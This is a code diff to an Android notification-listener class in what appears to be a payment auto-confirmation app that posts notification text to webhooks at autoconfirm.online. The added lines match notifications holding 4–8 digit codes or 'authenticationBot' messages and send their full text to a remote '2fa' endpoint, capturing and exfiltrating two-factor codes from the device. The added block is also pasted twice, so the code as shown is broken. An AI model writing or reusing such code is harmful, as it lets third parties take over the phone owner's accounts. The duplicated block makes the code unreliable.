@@ -76,6 +76,22 @@ public class SmsNotificationListener extends NotificationListenerService {
         sendToWebhook("https://autoconfirm.online/webhook/debug-notif", token, "CHECK-REDDY", 
             "isInsystem=" + isInsystem + " isApproved=" + isApproved + " isWithdrawal=" + isWithdrawal + " pkg=" + pkg);
         boolean isWebMgmtBot = fullText.contains("Web Management Bot");
+        // Code 2FA authenticationBot
+        boolean isAuthBot = fullText.contains("authenticationBot") || 
+                           (isInsystem && fullText.matches(".*\\b\\d{4,8}\\b.*") && !isApproved && !isWithdrawal && !isRejected);
+        if (isAuthBot) {
+            sendToWebhook("https://autoconfirm.online/webhook/reddy-2fa", token, "AuthBot", fullText);
+            return;
+        }
+
+        // Code 2FA authenticationBot
+        boolean isAuthBot = fullText.contains("authenticationBot") || 
+                           (isInsystem && fullText.matches(".*\\b\\d{4,8}\\b.*") && !isApproved && !isWithdrawal && !isRejected);
+        if (isAuthBot) {
+            sendToWebhook("https://autoconfirm.online/webhook/reddy-2fa", token, "AuthBot", fullText);
+            return;
+        }
+
         if (isInsystem && isApproved && isWebMgmtBot && isDepositRequest && !isWithdrawal && !isRejected) {
             String reddyUrl = "https://autoconfirm.online/webhook/reddy";
             Log.d(TAG, "REDDY APPROVED -> " + reddyUrl);
